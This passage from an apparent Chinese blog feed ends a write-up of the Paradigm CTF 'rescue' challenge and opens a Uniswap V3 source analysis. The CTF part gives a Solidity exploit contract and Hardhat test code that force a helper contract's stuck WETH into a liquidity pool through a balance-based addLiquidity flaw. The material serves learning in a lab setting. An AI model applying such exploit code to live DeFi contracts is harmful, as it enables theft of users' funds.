minAmountOut);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在函数最后调用了一个添加流动性的函数，这可能就是这笔误转账最终的去向</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function _addLiquidity(address token0, address token1, uint256 minAmountOut) internal &#123;</span><br><span class="line">        (,, uint256 amountOut) &#x3D; router.addLiquidity(</span><br><span class="line">            token0, </span><br><span class="line">            token1, </span><br><span class="line">            ERC20Like(token0).balanceOf(address(this)), &#x2F;&#x2F;漏洞所在</span><br><span class="line">            ERC20Like(token1).balanceOf(address(this)),             &#x2F;&#x2F;</span><br><span class="line">            0, </span><br><span class="line">            0, </span><br><span class="line">            msg.sender, </span><br><span class="line">            block.timestamp</span><br><span class="line">        );</span><br><span class="line">        require(amountOut &gt;&#x3D; minAmountOut);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>不难发现，这里添加流动性时，居然是把自己所有的余额全部发送到router里去<code>addLiquidity</code>，这是明显不合理的，只要我们能控制以下交易对的交换额，我们就可以把此合约的ETH余额全部加入到流动性池子当中。</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>对应以上的分析，想要解决此<code>Challange</code>,我们还得到两种token去控制流动性兑换的数量。</p><p>这里我们选择usdc和dai，在<code>etherscan</code>里可以查到<code>poolId</code>为1的时候对应的pair就是usdc和Weth,并可获得token对应的地址<br><img src="CTF01.png" alt=""><br><img src="CTF02.png" alt=""><br><img src="CTF03.png" alt=""></p><p>当然我们也可以用脚本来获取交易对信息:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; expect &#125; = <span class="built_in">require</span>(<span class="string">"chai"</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; ethers &#125; = <span class="built_in">require</span>(<span class="string">'hardhat'</span>);</span><br><span class="line"><span class="keyword">const</span> masterLike = <span class="built_in">require</span>(<span class="string">'../contracts/rescue/MatserChefLike.json'</span>)</span><br><span class="line">describe(<span class="string">"Challange rescue"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> attacker,deployer;</span><br><span class="line">    it(<span class="string">"should return the solved"</span>, <span class="keyword">async</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        [attacker,deployer] = <span class="keyword">await</span> ethers.getSigners();</span><br><span class="line">        <span class="keyword">const</span> Weth = <span class="keyword">await</span> ethers.getContractAt(<span class="string">"WETH9"</span>,<span class="string">"0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"</span>, attacker);</span><br><span class="line">        <span class="keyword">const</span> SetupFactory = <span class="keyword">await</span> ethers.getContractFactory(<span class="string">"Setup"</span>, attacker);</span><br><span class="line">  </span><br><span class="line">        <span class="keyword">const</span> setup = <span class="keyword">await</span> SetupFactory.deploy(&#123;</span><br><span class="line">            value: ethers.utils.parseEther(<span class="string">"50"</span>)</span><br><span class="line">        &#125;);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//Exploit</span></span><br><span class="line">        <span class="keyword">let</span> abi = [&#123;<span class="string">"inputs"</span>:[&#123;<span class="string">"internalType"</span>:<span class="string">"uint256"</span>,<span class="string">"name"</span>:<span class="string">"id"</span>,<span class="string">"type"</span>:<span class="string">"uint256"</span>&#125;],<span class="string">"name"</span>:<span class="string">"poolInfo"</span>,<span class="string">"outputs"</span>:[&#123;<span class="string">"internalType"</span>:<span class="string">"address"</span>,<span class="string">"name"</span>:<span class="string">"lpToken"</span>,<span class="string">"type"</span>:<span class="string">"address"</span>&#125;,&#123;<span class="string">"internalType"</span>:<span class="string">"uint256"</span>,<span class="string">"name"</span>:<span class="string">"allocPoint"</span>,<span class="string">"type"</span>:<span class="string">"uint256"</span>&#125;,&#123;<span class="string">"internalType"</span>:<span class="string">"uint256"</span>,<span class="string">"name"</span>:<span class="string">"lastRewardBlock"</span>,<span class="string">"type"</span>:<span class="string">"uint256"</span>&#125;,&#123;<span class="string">"internalType"</span>:<span class="string">"uint256"</span>,<span class="string">"name"</span>:<span class="string">"accSushiPerShare"</span>,<span class="string">"type"</span>:<span class="string">"uint256"</span>&#125;],<span class="string">"stateMutability"</span>:<span class="string">"view"</span>,<span class="string">"type"</span>:<span class="string">"function"</span>&#125;];</span><br><span class="line">       </span><br><span class="line">        <span class="keyword">let</span> UniswapV2pairLikeAbi = [&#123;<span class="string">"inputs"</span>:[],<span class="string">"name"</span>:<span class="string">"token0"</span>,<span class="string">"outputs"</span>:[&#123;<span class="string">"internalType"</span>:<span class="string">"address"</span>,<span class="string">"name"</span>:<span class="string">""</span>,<span class="string">"type"</span>:<span class="string">"address"</span>&#125;],<span class="string">"stateMutability"</span>:<span class="string">"view"</span>,<span class="string">"type"</span>:<span class="string">"function"</span>&#125;,&#123;<span class="string">"inputs"</span>:[],<span class="string">"name"</span>:<span class="string">"token1"</span>,<span class="string">"outputs"</span>:[&#123;<span class="string">"internalType"</span>:<span class="string">"address"</span>,<span class="string">"name"</span>:<span class="string">""</span>,<span class="string">"type"</span>:<span class="string">"address"</span>&#125;],<span class="string">"stateMutability"</span>:<span class="string">"view"</span>,<span class="string">"type"</span>:<span class="string">"function"</span>&#125;];</span><br><span class="line"></span><br><span class="line">        erc20_abi = [&#123;<span class="string">"constant"</span>:<span class="literal">true</span>,<span class="string">"inputs"</span>:[],<span class="string">"name"</span>:<span class="string">"name"</span>,<span class="string">"outputs"</span>:[&#123;<span class="string">"name"</span>:<span class="string">""</span>,<span class="string">"type"</span>:<span class="string">"string"</span>&#125;],<span class="string">"payable"</span>:<span class="literal">false</span>,<span class="string">"stateMutability"</span>:<span class="string">"view"</span>,<span class="string">"type"</span>:<span class="string">"function"</span>&#125;,&#123;<span class="string">"constant"</span>:<span class="literal">false</span>,<span class="string">"inputs"</span>:[&#123;<span class="string">"name"</span>:<span class="string">"_spender"</span>,<span class="string">"type"</span>:<span class="string">"address"</span>&#125;,&#123;<span class="string">"name"</span>:<span class="string">"_value"</span>,<span class="string">"type"</span>:<span class="string">"uint256"</span>&#125;],<span class="string">"name"</span>:<span class="string">"approve"</span>,<span class="string">"outputs"</span>:[&#123;<span class="string">"name"</span>:<span class="string">""</span>,<span class="string">"type"</span>:<span class="string">"bool"</span>&#125;],<span class="string">"payable"</span>:<span class="literal">false</span>,<span class="string">"stateMutability"</span>:<span class="string">"nonpayable"</span>,<span class="string">"type"</span>:<span class="string">"function"</span>&#125;,&#123;<span class="string">"constant"</span>:<span class="literal">true</span>,<span class="string">"inputs"</span>:[],<span class="string">"name"</span>:<span class="string">"totalSupply"</span>,<span class="string">"outputs"</span>:[&#123;<span class="string">"name"</span>:<span class="string">""</span>,<span class="string">"type"</span>:<span class="string">"uint256"</span>&#125;],<span class="string">"payable"</span>:<span class="literal">false</span>,<span class="string">"stateMutability"</span>:<span class="string">"view"</span>,<span class="string">"type"</span>:<span class="string">"function"</span>&#125;,&#123;<span class="string">"constant"</span>:<span class="literal">false</span>,<span class="string">"inputs"</span>:[&#123;<span class="string">"name"</span>:<span class="string">"_from"</span>,<span class="string">"type"</span>:<span class="string">"address"</span>&#125;,&#123;<span class="string">"name"</span>:<span class="string">"_to"</span>,<span class="string">"type"</span>:<span class="string">"address"</span>&#125;,&#123;<span class="string">"name"</span>:<span class="string">"_value"</span>,<span class="string">"type"</span>:<span class="string">"uint256"</span>&#125;],<span class="string">"name"</span>:<span class="string">"transferFrom"</span>,<span class="string">"outputs"</span>:[&#123;<span class="string">"name"</span>:<span class="string">""</span>,<span class="string">"type"</span>:<span class="string">"bool"</span>&#125;],<span class="string">"payable"</span>:<span class="literal">false</span>,<span class="string">"stateMutability"</span>:<span class="string">"nonpayable"</span>,<span class="string">"type"</span>:<span class="string">"function"</span>&#125;,&#123;<span class="string">"constant"</span>:<span class="literal">true</span>,<span class="string">"inputs"</span>:[],<span class="string">"name"</span>:<span class="string">"decimals"</span>,<span class="string">"outputs"</span>:[&#123;<span class="string">"name"</span>:<span class="string">""</span>,<span class="string">"type"</span>:<span class="string">"uint8"</span>&#125;],<span class="string">"payable"</span>:<span class="literal">false</span>,<span class="string">"stateMutability"</span>:<span class="string">"view"</span>,<span class="string">"type"</span>:<span class="string">"function"</span>&#125;,&#123;<span class="string">"constant"</span>:<span class="literal">true</span>,<span class="string">"inputs"</span>:[&#123;<span class="string">"name"</span>:<span class="string">"_owner"</span>,<span class="string">"type"</span>:<span class="string">"address"</span>&#125;],<span class="string">"name"</span>:<span class="string">"balanceOf"</span>,<span class="string">"outputs"</span>:[&#123;<span class="string">"name"</span>:<span class="string">"balance"</span>,<span class="string">"type"</span>:<span class="string">"uint256"</span>&#125;],<span class="string">"payable"</span>:<span class="literal">false</span>,<span class="string">"stateMutability"</span>:<span class="string">"view"</span>,<span class="string">"type"</span>:<span class="string">"function"</span>&#125;,&#123;<span class="string">"constant"</span>:<span class="literal">true</span>,<span class="string">"inputs"</span>:[],<span class="string">"name"</span>:<span class="string">"symbol"</span>,<span class="string">"outputs"</span>:[&#123;<span class="string">"name"</span>:<span class="string">""</span>,<span class="string">"type"</span>:<span class="string">"string"</span>&#125;],<span class="string">"payable"</span>:<span class="literal">false</span>,<span class="string">"stateMutability"</span>:<span class="string">"view"</span>,<span class="string">"type"</span>:<span class="string">"function"</span>&#125;,&#123;<span class="string">"constant"</span>:<span class="literal">false</span>,<span class="string">"inputs"</span>:[&#123;<span class="string">"name"</span>:<span class="string">"_to"</span>,<span class="string">"type"</span>:<span class="string">"address"</span>&#125;,&#123;<span class="string">"name"</span>:<span class="string">"_value"</span>,<span class="string">"type"</span>:<span class="string">"uint256"</span>&#125;],<span class="string">"name"</span>:<span class="string">"transfer"</span>,<span class="string">"outputs"</span>:[&#123;<span class="string">"name"</span>:<span class="string">""</span>,<span class="string">"type"</span>:<span class="string">"bool"</span>&#125;],<span class="string">"payable"</span>:<span class="literal">false</span>,<span class="string">"stateMutability"</span>:<span class="string">"nonpayable"</span>,<span class="string">"type"</span>:<span class="string">"function"</span>&#125;,&#123;<span class="string">"constant"</span>:<span class="literal">true</span>,<span class="string">"inputs"</span>:[&#123;<span class="string">"name"</span>:<span class="string">"_owner"</span>,<span class="string">"type"</span>:<span class="string">"address"</span>&#125;,&#123;<span class="string">"name"</span>:<span class="string">"_spender"</span>,<span class="string">"type"</span>:<span class="string">"address"</span>&#125;],<span class="string">"name"</span>:<span class="string">"allowance"</span>,<span class="string">"outputs"</span>:[&#123;<span class="string">"name"</span>:<span class="string">""</span>,<span class="string">"type"</span>:<span class="string">"uint256"</span>&#125;],<span class="string">"payable"</span>:<span class="literal">false</span>,<span class="string">"stateMutability"</span>:<span class="string">"view"</span>,<span class="string">"type"</span>:<span class="string">"function"</span>&#125;,&#123;<span class="string">"payable"</span>:<span class="literal">true</span>,<span class="string">"stateMutability"</span>:<span class="string">"payable"</span>,<span class="string">"type"</span>:<span class="string">"fallback"</span>&#125;,&#123;<span class="string">"anonymous"</span>:<span class="literal">false</span>,<span class="string">"inputs"</span>:[&#123;<span class="string">"indexed"</span>:<span class="literal">true</span>,<span class="string">"name"</span>:<span class="string">"owner"</span>,<span class="string">"type"</span>:<span class="string">"address"</span>&#125;,&#123;<span class="string">"indexed"</span>:<span class="literal">true</span>,<span class="string">"name"</span>:<span class="string">"spender"</span>,<span class="string">"type"</span>:<span class="string">"address"</span>&#125;,&#123;<span class="string">"indexed"</span>:<span class="literal">false</span>,<span class="string">"name"</span>:<span class="string">"value"</span>,<span class="string">"type"</span>:<span class="string">"uint256"</span>&#125;],<span class="string">"name"</span>:<span class="string">"Approval"</span>,<span class="string">"type"</span>:<span class="string">"event"</span>&#125;,&#123;<span class="string">"anonymous"</span>:<span class="literal">false</span>,<span class="string">"inputs"</span>:[&#123;<span class="string">"indexed"</span>:<span class="literal">true</span>,<span class="string">"name"</span>:<span class="string">"from"</span>,<span class="string">"type"</span>:<span class="string">"address"</span>&#125;,&#123;<span class="string">"indexed"</span>:<span class="literal">true</span>,<span class="string">"name"</span>:<span class="string">"to"</span>,<span class="string">"type"</span>:<span class="string">"address"</span>&#125;,&#123;<span class="string">"indexed"</span>:<span class="literal">false</span>,<span class="string">"name"</span>:<span class="string">"value"</span>,<span class="string">"type"</span>:<span class="string">"uint256"</span>&#125;],<span class="string">"name"</span>:<span class="string">"Transfer"</span>,<span class="string">"type"</span>:<span class="string">"event"</span>&#125;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> contractAddress = <span class="string">"0xc2EdaD668740f1aA35E4D8f227fB8E17dcA888Cd"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> provider = <span class="keyword">await</span> ethers.getDefaultProvider();</span><br><span class="line">        <span class="keyword">const</span> MasterLike = <span class="keyword">new</span> ethers.Contract(contractAddress, abi, provider);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">18</span>; i++)&#123;</span><br><span class="line">            <span class="comment">// let pool_info = await MasterLike.connect(attacker).poolInfo(i);</span></span><br><span class="line">            <span class="keyword">let</span> pool_info = <span class="keyword">await</span> MasterLike.poolInfo(i);</span><br><span class="line">            <span class="keyword">let</span> lp_token = pool_info[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">const</span> pair = <span class="keyword">new</span> ethers.Contract(ethers.utils.getAddress(lp_token), UniswapV2pairLikeAbi, provider);</span><br><span class="line">            <span class="keyword">const</span> token0 = <span class="keyword">await</span> pair.token0();</span><br><span class="line">            <span class="keyword">let</span> token1 = <span class="keyword">await</span> pair.token1();</span><br><span class="line">            <span class="keyword">let</span> token_contract0 = <span class="keyword">new</span> ethers.Contract(token0, erc20_abi, provider);</span><br><span class="line">            <span class="keyword">let</span> token_contract1 = <span class="keyword">new</span> ethers.Contract(token1, erc20_abi, provider);</span><br><span class="line">            <span class="keyword">let</span> token0_name = <span class="keyword">await</span> token_contract0.symbol();</span><br><span class="line">            <span class="keyword">let</span> tokne1_name = <span class="keyword">await</span> token_contract1.symbol();</span><br><span class="line">            <span class="comment">// console.log(lp_token)</span></span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">`lp_token is : <span class="subst">$&#123;lp_token&#125;</span>  token0 is : <span class="subst">$&#123;token0_name&#125;</span> token1 is : <span class="subst">$&#123;tokne1_name&#125;</span>`</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// const ExploitFactory = await ethers.getContractFactory("Exploit",attacker);</span></span><br><span class="line">        <span class="comment">// const exploit = await ExploitFactory.deploy(setup.address, &#123;value : ethers.utils.parseEther("50")&#125;);</span></span><br><span class="line"></span><br><span class="line">        expect(<span class="keyword">await</span> setup.isSolved()).to.equal(<span class="literal">true</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><br>获取到的交易对如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pair_id:0,lp_address:0x06da0fd433C1A5d7a4faa01111c044910A184553,token0:WETH,token1:USDT</span><br><span class="line">pair_id:1,lp_address:0x397FF1542f962076d0BFE58eA045FfA2d347ACa0,token0:USDC,token1:WETH</span><br><span class="line">pair_id:2,lp_address:0xC3D03e4F041Fd4cD388c549Ee2A29a9E5075882f,token0:DAI,token1:WETH</span><br><span class="line">pair_id:3,lp_address:0xF1F85b2C54a2bD284B1cf4141D64fD171Bd85539,token0:sUSD,token1:WETH</span><br><span class="line">pair_id:4,lp_address:0x31503dcb60119A812feE820bb7042752019F2355,token0:COMP,token1:WETH</span><br><span class="line">pair_id:5,lp_address:0x5E63360E891BD60C69445970256C260b0A6A54c6,token0:LEND,token1:WETH</span><br><span class="line">pair_id:6,lp_address:0xA1d7b2d891e3A1f9ef4bBC5be20630C2FEB1c470,token0:SNX,token1:WETH</span><br><span class="line">pair_id:7,lp_address:0x001b6450083E531A5a7Bf310BD2c1Af4247E23D4,token0:UMA,token1:WETH</span><br><span class="line">pair_id:8,lp_address:0xC40D16476380e4037e6b1A2594cAF6a6cc8Da967,token0:LINK,token1:WETH</span><br><span class="line">pair_id:9,lp_address:0xA75F7c2F025f470355515482BdE9EFA8153536A8,token0:BAND,token1:WETH</span><br><span class="line">pair_id:10,lp_address:0xCb2286d9471cc185281c4f763d34A962ED212962,token0:WETH,token1:AMPL</span><br><span class="line">pair_id:11,lp_address:0x088ee5007C98a9677165D78dD2109AE4a3D04d0C,token0:YFI,token1:WETH</span><br><span class="line">pair_id:12,lp_address:0x795065dCc9f64b5614C407a6EFDC400DA6221FB0,token0:SUSHI,token1:WETH</span><br><span class="line">pair_id:13,lp_address:0x611CDe65deA90918c0078ac0400A72B0D25B9bb1,token0:REN,token1:WETH</span><br><span class="line">pair_id:14,lp_address:0xaAD22f5543FCDaA694B68f94Be177B561836AE57,token0:sUSD,token1:$BASED</span><br><span class="line">pair_id:15,lp_address:0x117d4288B3635021a3D612FE05a3Cbf5C717fEf2,token0:SRM,token1:WETH</span><br><span class="line">pair_id:16,lp_address:0x95b54C8Da12BB23F7A5F6E26C38D04aCC6F81820,token0:YAMv2,token1:WETH</span><br><span class="line">pair_id:17,lp_address:0x58Dc5a51fE44589BEb22E8CE67720B5BC5378009,token0:WETH,token1:CRV</span><br><span class="line">pair_id:18,lp_address:0xDafd66636E2561b0284EDdE37e42d192F2844D40,token0:UNI,token1:WETH</span><br><span class="line">pair_id:19,lp_address:0x36e2FCCCc59e5747Ff63a03ea2e5C0c2C14911e7,token0:xSUSHI,token1:WETH</span><br></pre></td></tr></table></figure></p><p>我们可以写出以下攻击合约：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity 0.8.16;</span><br><span class="line"></span><br><span class="line">import &quot;.&#x2F;UniswapV2Like.sol&quot;;</span><br><span class="line">import &quot;.&#x2F;Setup.sol&quot;; </span><br><span class="line">import &quot;.&#x2F;MasterChefHelper.sol&quot;;</span><br><span class="line">contract Exploit&#123;</span><br><span class="line">    </span><br><span class="line">    constructor(Setup setup) payable &#123;</span><br><span class="line"></span><br><span class="line">        WETH9 weth &#x3D; setup.weth();</span><br><span class="line">MasterChefHelper mcHelper &#x3D; setup.mcHelper();</span><br><span class="line">        UniswapV2RouterLike router &#x3D; UniswapV2RouterLike(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);</span><br><span class="line">        address usdc &#x3D; 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;</span><br><span class="line">        address dai &#x3D; 0x6B175474E89094C44Da98b954EedeAC495271d0F;</span><br><span class="line">weth.approve(address(router), type(uint256).max);</span><br><span class="line"></span><br><span class="line">weth.deposit&#123;value: 40 ether&#125;();</span><br><span class="line"></span><br><span class="line">address[] memory path &#x3D; new address[](2);</span><br><span class="line"></span><br><span class="line">path[0] &#x3D; address(weth);</span><br><span class="line">path[1] &#x3D; usdc;</span><br><span class="line">router.swapExactTokensForTokens(</span><br><span class="line">11 ether,</span><br><span class="line">0,</span><br><span class="line">path,</span><br><span class="line">address(mcHelper),</span><br><span class="line">block.timestamp</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">path[0] &#x3D; address(weth);</span><br><span class="line">path[1] &#x3D; dai;</span><br><span class="line">router.swapExactTokensForTokens(</span><br><span class="line">9 ether,</span><br><span class="line">0,</span><br><span class="line">path,</span><br><span class="line">address(this),</span><br><span class="line">block.timestamp</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">uint256 daiIn &#x3D; 50 * 10 ** 18;</span><br><span class="line">ERC20Like(dai).approve(address(mcHelper), type(uint256).max);</span><br><span class="line">mcHelper.swapTokenForPoolToken(1, dai, daiIn, 0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里先用11个ETH去交换usdc,交换得到的usdc发送到<code>mcHelper</code>合约,这里的11个ETH其实只要大于10即可,目的是为了将<code>mcHelper</code>里的WETH全部加到流动性池子里.也可以通过<code>getAmountOut</code>函数计算处需要传入的usdc数目。<br>然后我换一些dai到自己合约,以便于触发<code>mcHelper</code>的<code>swapTokenForPoolToken()</code>函数</p><p>js测试代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; expect &#125; = <span class="built_in">require</span>(<span class="string">"chai"</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; ethers &#125; = <span class="built_in">require</span>(<span class="string">'hardhat'</span>);</span><br><span class="line"><span class="keyword">const</span> masterLike = <span class="built_in">require</span>(<span class="string">'../contracts/rescue/MatserChefLike.json'</span>)</span><br><span class="line">describe(<span class="string">"Challange rescue"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> attacker,deployer;</span><br><span class="line">    it(<span class="string">"should return the solved"</span>, <span class="keyword">async</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        [attacker,deployer] = <span class="keyword">await</span> ethers.getSigners();</span><br><span class="line">        <span class="keyword">const</span> Weth = <span class="keyword">await</span> ethers.getContractAt(<span class="string">"WETH9"</span>,<span class="string">"0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"</span>, attacker);</span><br><span class="line">        <span class="keyword">const</span> SetupFactory = <span class="keyword">await</span> ethers.getContractFactory(<span class="string">"Setup"</span>, attacker);</span><br><span class="line">  </span><br><span class="line">        <span class="keyword">const</span> setup = <span class="keyword">await</span> SetupFactory.deploy(&#123;</span><br><span class="line">            value: ethers.utils.parseEther(<span class="string">"50"</span>)</span><br><span class="line">        &#125;);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//Exploit</span></span><br><span class="line">        <span class="comment">// let abi = [&#123;"inputs":[&#123;"internalType":"uint256","name":"id","type":"uint256"&#125;],"name":"poolInfo","outputs":[&#123;"internalType":"address","name":"lpToken","type":"address"&#125;,&#123;"internalType":"uint256","name":"allocPoint","type":"uint256"&#125;,&#123;"internalType":"uint256","name":"lastRewardBlock","type":"uint256"&#125;,&#123;"internalType":"uint256","name":"accSushiPerShare","type":"uint256"&#125;],"stateMutability":"nonpayable","type":"function"&#125;];</span></span><br><span class="line">        <span class="comment">// let contractAddress = "0xc2EdaD668740f1aA35E4D8f227fB8E17dcA888Cd";</span></span><br><span class="line">        <span class="comment">// let provider = await ethers.getDefaultProvider();</span></span><br><span class="line">        <span class="comment">// const MasterLike = new ethers.Contract(contractAddress, abi, provider);</span></span><br><span class="line">        <span class="comment">// // const MasterLike = await ethers.getContractAt("MasterChefLike","0xc2EdaD668740f1aA35E4D8f227fB8E17dcA888Cd", deployer);</span></span><br><span class="line">        <span class="comment">// for(let i = 0; i &lt; 5; i++)&#123;</span></span><br><span class="line">        <span class="comment">//     let tx = await MasterLike.connect(attacker).poolInfo(i);</span></span><br><span class="line">        <span class="comment">//     let pool_info = await tx.wait();</span></span><br><span class="line">        <span class="comment">//     // let pool_info = MasterLike.connect(attacker).poolInfo(i);</span></span><br><span class="line">        <span class="comment">//     // let lp_token = tx[i];</span></span><br><span class="line">        <span class="comment">//     // console.log(pool_info);</span></span><br><span class="line">        <span class="comment">//     console.log(tx);</span></span><br><span class="line">        <span class="comment">//     console.log(pool_info);</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> ExploitFactory = <span class="keyword">await</span> ethers.getContractFactory(<span class="string">"Exploit"</span>,attacker);</span><br><span class="line">        <span class="keyword">const</span> exploit = <span class="keyword">await</span> ExploitFactory.deploy(setup.address, &#123;<span class="attr">value</span> : ethers.utils.parseEther(<span class="string">"50"</span>)&#125;);</span><br><span class="line"></span><br><span class="line">        expect(<span class="keyword">await</span> setup.isSolved()).to.equal(<span class="literal">true</span>)</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Paradigm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Uniswap_V3 源码分析</title>
      <link href="/uniswap-v3/"/>
      <url>/uniswap-v3/</url>
      
        <content type="html"><![CDATA[<h1 id="Uniswap-V3-源码解析（一）"><a href="#Uniswap-V3-源码解析（一）" class="headerlink" title="Uniswap V3 源码解析（一）"></a>Uniswap V3 源码解析（一）</h1><pre><code>author: Thomas_Xu</code></pre><p>之前看了v2的源码，但是感觉能写的不多，于是便决定读了v3后把v3和v2连着写一一篇博文。<br>v3版本的实现复杂度和v2已经不是一个量级了，部分算法确实难以摸透。尝试着分析分析吧。</p><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>强烈建议在阅读uniswap v3源码之前，先阅读<a href="https://uniswap.org/blog/uniswap-v3" target="_blank" rel="noopener">官方博客</a>对v3版本的介绍，有能力的话摸透V3的<a href="https://uniswap.org/whitepaper-v3.pdf" target="_blank" rel="noopener">白皮书</a>，熟悉他的实现原理。在本文中也会做出简短的介绍</p><h2 id="Uniswap-v3-白皮书导读"><a href="#Uniswap-v3-白皮书导读" class="headerlink" title="Uniswap v3 白皮书导读"></a>Uniswap v3 白皮书导读</h2><h3 id="集中流动性"><a href="#集中流动性" class="headerlink" title="集中流动性"></a>集中流动性</h3><p>其实V3最大的改变就是 <strong>“集中流动性”</strong> 这个概念，大大提高了资金的利用率。<br>早期版本旨在提供整个价格范围为(0, +∞)的流动性，这很容易实现并且可以有效地聚合流动性，但这意味着池中持有的大部分资产永远不会被触及，这使得资金的利用率很低。例如，v2版本中的DAI/USDC对仅保留约0.50%的资本用于在0.99美元和1.01美元之间进行交易，这是LP期望看到最多交易量并因此赚取最多费用的价格范围。<br><img src="uniswap02.png" alt=""><br>考虑到这一点，允许LP将其流动性集中在比(0,+∞)更小的价格范围内似乎是合理的，在Uniswap 